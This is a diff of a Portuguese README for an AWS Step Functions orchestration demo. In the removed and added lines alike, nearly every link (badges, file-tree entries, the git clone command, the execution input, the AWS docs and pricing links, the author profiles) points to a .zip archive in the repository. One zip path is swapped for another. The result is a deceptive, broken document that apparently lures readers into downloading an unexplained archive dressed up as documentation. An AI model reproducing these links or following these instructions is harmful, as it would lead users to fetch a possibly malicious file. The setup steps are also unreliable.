@@ -2,10 +2,10 @@
 
 <div align="center">
 
-[![AWS](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip%20Functions-FF9900?style=flat&logo=amazon-aws)](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip)
-[![Python](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip)](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip)
-[![License](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip)](LICENSE)
-[![GitHub](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip)](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip)
+[![AWS](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip%20Functions-FF9900?style=flat&logo=amazon-aws)](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
+[![Python](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
+[![License](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)](LICENSE)
+[![GitHub](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
 
 **Orquestração serverless com AWS Step Functions integrando Lambda, S3, DynamoDB, API Gateway e SNS.**
 
@@ -86,23 +86,23 @@ Este projeto demonstra como usar **AWS Step Functions** para orquestrar um workf
 
 ```
 aws-stepfunctions-serverless-orchestration-demo/
-├── 📄 https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip                          # Este arquivo
+├── 📄 https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                          # Este arquivo
 ├── 📄 .gitignore                         # Exclusões Git (Python)
 │
 ├── infra/                                # Infrastructure as Code
-│   ├── https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip             # State Machine Definition
-│   └── https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip                     # AWS SAM Template
+│   ├── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip             # State Machine Definition
+│   └── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                     # AWS SAM Template
 │
 ├── src/                                  # Código das Lambdas
 │   ├── process-data/
-│   │   └── https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip                        # Valida/enriquece dados
+│   │   └── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                        # Valida/enriquece dados
 │   ├── finalize/
-│   │   └── https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip                        # Consolida resultados
+│   │   └── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                        # Consolida resultados
 │   └── handle-error/
-│       └── https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip                        # Tratamento de erros
+│       └── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                        # Tratamento de erros
 │
 └── events/                               # Eventos de Teste
-    └── https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip                        # Payload de exemplo
+    └── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                        # Payload de exemplo
 ```
 
 ---
@@ -152,7 +152,7 @@ aws-stepfunctions-serverless-orchestration-demo/
 
 ### 1. Clone o Repositório
 ```bash
-git clone https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip
+git clone https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip
 cd aws-stepfunctions-serverless-orchestration-demo
 ```
 
@@ -192,7 +192,7 @@ sam deploy --guided
 ```bash
 aws stepfunctions start-execution \
   --state-machine-arn "arn:aws:states:us-east-1:ACCOUNT_ID:stateMachine:stepfunctions-demo" \
-  --input https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip
+  --input https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip
 ```
 
 ---
@@ -231,7 +231,7 @@ aws logs tail /aws/lambda/FinalizeFunctionwhere --follow
 - Tempo por estado
 
 ### X-Ray Tracing (Opcional)
-Altere `https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip`:
+Altere `https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip`:
 ```yaml
 TracingConfig:
   Mode: Active
@@ -251,14 +251,14 @@ TracingConfig:
 | SNS | 1M publishes | ~$0.50 |
 | **Total** | | **~$7-10** |
 
-*Nota: Inclui free tier. Consulte [AWS Pricing](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip) para detalhes.*
+*Nota: Inclui free tier. Consulte [AWS Pricing](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip) para detalhes.*
 
 ---
 
 ## 🔒 Segurança
 
 ✅ **IAM Roles**: Least privilege por Lambda  
-✅ **VPC (Opcional)**: Configure em `https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip`  
+✅ **VPC (Opcional)**: Configure em `https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip`  
 ✅ **Encryption**: S3 SSE, DynamoDB encryption habilitados  
 ✅ **API Gateway**: Adicione API Keys/WAF  
 ✅ **Logging**: CloudWatch + X-Ray tracing  
@@ -267,10 +267,10 @@ TracingConfig:
 
 ## 📚 Recursos Úteis
 
-- [AWS Step Functions Docs](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip)
-- [State Machine Example](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip)
-- [AWS SAM Guide](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip)
-- [Lambda Best Practices](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip)
+- [AWS Step Functions Docs](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
+- [State Machine Example](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
+- [AWS SAM Guide](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
+- [Lambda Best Practices](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
 
 ---
 
@@ -294,8 +294,8 @@ Este projeto é **MIT Licensed** - veja [LICENSE](LICENSE) para detalhes.
 ## 👤 Autor
 
 **Luciano Gião**
-- GitHub: [@LucianoHMG](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zip)
-- LinkedIn: [Luciano Gião](https://github.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/raw/refs/heads/main/infra/orchestration_serverless_demo_aws_stepfunctions_3.4.zipão)
+- GitHub: [@LucianoHMG](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
+- LinkedIn: [Luciano Gião](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zipão)
 - AWS Certification: AWS Cloud Practitioner + Solutions Architect Associate
 
 ---
